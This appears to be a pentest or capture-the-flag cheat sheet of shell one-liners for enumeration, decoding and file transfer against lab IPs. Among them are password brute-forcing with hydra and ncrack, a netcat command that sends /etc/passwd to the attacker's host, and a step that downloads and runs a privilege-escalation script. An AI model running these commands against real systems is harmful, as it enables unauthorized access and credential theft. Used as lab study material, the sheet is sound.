## Quick and Dirty Commands

For the following examples assume:

**Remote IP:** `10.37.129.11`

**Local IP:** `10.37.129.4`

##### Find a file with the a specified string
`cat /etc/* | grep FLAG2`

##### Grep only usernames from /etc/passwd
`cat /etc/passwd | grep -E '/home/|/root'`

##### Regex in Grep
`ls -al | grep '[a-z][0-9].jpeg'`

##### HEX to ASCII convert
`echo "46 4c 41 47" | xxd -r -ps`

##### Base64 Decode
`echo dmlldyBzb3VyY2UgO0QK | base64 -D`

##### Check webserver for things
`nikto -h 10.37.129.11`

##### Enumerate directories
`dirb http://10.37.129.11`

##### Enumerate Linux (Gets OS, host, shares, potential usernames)
`enum4linux -a 10.37.129.11`

##### FTP on custom port
`ftp -p 10.37.129.11 4200`

##### SSH on custom port
`ssh user@10.37.129.11 -p 22222`

##### Search for a package on the system
`rpm -qa | grep ftp`

##### Copy file over netcat | nc
Local Listener: `nc -l -p 2222 > passwd`

Remote Listener: `cat /etc/passwd | netcat 10.37.129.4 2222`

##### Copy file over SCP
```bash
$ scp -r -P 22 username@10.37.129.4:/home/whatever ~/<destination>
$ scp safe root@10.37.129.11:~/<destination>
```

##### Hydra quick user/password enumeration
`hydra -L /usr/share/wordlists/custom/usernamelist.txt -P /usr/share/wordlists/custom/passwordlist.txt -u -s 22 10.37.129.11 ssh -t 4`

##### NCRACK password enumeration and SSH crack
`ncrack -v –user <username> -P <password_list> ssh://10.37.129.11:22222`

##### Pull down linuxprivchecker.py and run
```bash
$ wget https://raw.githubusercontent.com/t04glovern/icu/master/tools/linuxprivchecker.py
$ python linuxprivchecker.py > linux_priv_check.txt
```

##### enum4linux ALL option
`enum4linux -a 10.37.129.11`

##### gzip extract
`tar -xzvf file.tar.gz`

##### DNS quert using nslookup
```bash
## Any records
nslookup -q=any domain.com

## Just specific ones
nslookup -q=TXT site.domain.com
```

##### smbclient scan
`smbclient -L 10.37.129.11`

##### smbclient connect
`smbclient '\\10.37.129.11\<sharename>'`

##### SMB share connect via web browser
`smb://10.37.129.11/<sharename>/`
